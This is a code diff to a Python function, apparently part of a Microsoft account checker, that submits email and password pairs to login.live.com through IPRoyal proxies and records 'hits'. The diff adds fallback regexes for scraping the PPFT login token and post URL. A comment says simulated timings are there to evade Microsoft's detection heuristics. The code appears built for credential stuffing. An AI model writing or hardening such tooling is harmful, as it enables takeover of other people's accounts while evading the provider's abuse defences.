@@ -364,19 +364,36 @@ def run_local_audit(email, password, iproyal_auth, hits_buffer, keyword="", user
             print(f"[DEBUG vps_agent {email}] Error Auth 1: Status {res1.status_code}")
             return
             
-        ppft_match = re.search(r'name="PPFT"[^>]*value="([^"]+)"', res1.text)
-        if not ppft_match: ppft_match = re.search(r'name=\\"PPFT\\"[^>]*value=\\"([^\\"]+)\\"', res1.text)
-        if not ppft_match: ppft_match = re.search(r'"sFT"\s*:\s*"([^"]+)"', res1.text)
-        
-        pl_match = re.search(r'urlPost\s*[\"\']?\s*:\s*[\"\']([^\"\']+)[\"\']', res1.text)
-        if not pl_match: pl_match = re.search(r'urlPost\s*:\s*"([^"]+)"', res1.text)
-            
-        if not ppft_match or not pl_match: 
-            print(f"[DEBUG vps_agent {email}] Error Auth 1: No se extrajo PPFT o PL. (Quizás proxy bloqueado o IP baneada temporamente)")
+        try:
+            ppft_match = re.search(r'name="PPFT"[^>]*value="([^"]+)"', res1.text)
+            if not ppft_match: ppft_match = re.search(r'name=\\"PPFT\\"[^>]*value=\\"([^\\"]+)\\"', res1.text)
+            if not ppft_match: ppft_match = re.search(r'"sFT"\s*:\s*"([^"]+)"', res1.text)
+            if not ppft_match: ppft_match = re.search(r'PPFT[^v]*value=(?:\\"|")(.*?)(?:\\"|")', res1.text)
+            if not ppft_match:
+                m = re.search(r'value="([-A-Za-z0-9+/=]{100,})"', res1.text)
+                if m:
+                    class _FM:
+                        def group(self, n): return m.group(1)
+                    ppft_match = _FM()
+                    
+            pl_match = re.search(r'urlPost\s*[\"\']?\s*:\s*[\"\']([^\"\']+)[\"\']', res1.text)
+            if not pl_match: pl_match = re.search(r'urlPost\s*:\s*"([^"]+)"', res1.text)
+            if not pl_match:
+                post_urls = re.findall(r'https://login\.live\.com/ppsecure/post\.srf[^"\'\\ ]*', res1.text)
+                if post_urls:
+                    class _FM:
+                        def group(self, n): return post_urls[0]
+                    pl_match = _FM()
+                
+            if not ppft_match or not pl_match: 
+                print(f"[DEBUG vps_agent {email}] Error Auth 1: No se extrajo PPFT o PL. (Quizás proxy bloqueado o IP baneada temporamente)")
+                return
+                
+            ppft = ppft_match.group(1)
+            post_url = pl_match.group(1)
+        except Exception as e:
+            print(f"[DEBUG vps_agent {email}] Error Auth 1 Parsing crash: {e}")
             return
-            
-        ppft = ppft_match.group(1)
-        post_url = pl_match.group(1)
         
         # Tiempos simulados (milisegundos) para evadir heurísticas de MS
         t_start = int(_t.time() * 1000) - _r.randint(15000, 35000) # Carga simulada
